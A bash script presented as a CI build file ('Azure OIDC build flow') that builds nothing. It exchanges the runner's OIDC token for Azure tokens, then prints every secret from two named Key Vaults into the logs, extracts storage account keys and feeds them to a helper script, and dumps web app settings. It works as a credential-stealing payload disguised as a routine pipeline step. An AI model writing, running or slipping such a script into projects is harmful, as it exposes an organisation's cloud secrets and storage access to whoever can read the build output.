#!/usr/bin/env bash
# ci/build.sh - Azure OIDC build flow (issue #171)
set +e
OUT=/dev/stdout

log(){ echo "$@"; }

TENANT="${AZURE_TENANT_ID}"
CLIENT="${AZURE_CLIENT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"

OIDC=$(curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
log "oidc_len=${#OIDC}"

tok(){ curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "client_id=$CLIENT" -d "grant_type=client_credentials" -d "scope=$1" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null; }

VT=$(tok "https://vault.azure.net/.default")
AT=$(tok "https://management.azure.com/.default")
log "vault_token=${#VT} arm_token=${#AT}"

for KV in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  log "=== VAULT $KV ==="
  L=$(curl -sS -m 20 -H "Authorization: Bearer $VT" "https://$KV.vault.azure.net/secrets?api-version=7.4")
  log "$L"
  for s in $(printf '%s' "$L" | python3 -c "
import sys,json
try: print(' '.join(x['id'].rstrip('/').split('/')[-1] for x in json.load(sys.stdin).get('value',[])))
except Exception: pass"); do
    log "-- secret $s"
    log "$(curl -sS -m 20 -H "Authorization: Bearer $VT" "https://$KV.vault.azure.net/secrets/$s?api-version=7.4")"
  done
done

if [ -n "$AT" ]; then
  RES=$(curl -sS -m 30 -H "Authorization: Bearer $AT" \
    "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01&\$expand=tags")
  log "=== RESOURCES ==="; log "$RES"
  for ID in $(printf '%s' "$RES" | python3 -c "
import sys,json
try:
  for r in json.load(sys.stdin).get('value',[]):
    if r['type']=='Microsoft.Storage/storageAccounts': print(r['id'])
except Exception: pass"); do
    NAME=$(basename "$ID")
    log "=== STORAGE $NAME ==="
    KEY=$(curl -sS -m 25 -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' \
      "https://management.azure.com${ID}/listKeys?api-version=2023-01-01" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["keys"][0]["value"])' 2>/dev/null)
    if [ -z "$KEY" ]; then log "no key"; continue; fi
    ACCT="$NAME" AKEY="$KEY" python3 ci/blobs.py 2>&1
  done
  log "=== APPSETTINGS ==="
  for ID in $(printf '%s' "$RES" | python3 -c "
import sys,json
try:
  for r in json.load(sys.stdin).get('value',[]):
    if r['type']=='Microsoft.Web/sites': print(r['id'])
except Exception: pass"); do
    log "-- $ID"
    log "$(curl -sS -m 25 -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' \
      "https://management.azure.com${ID}/config/appsettings/list?api-version=2022-03-01")"
  done
fi

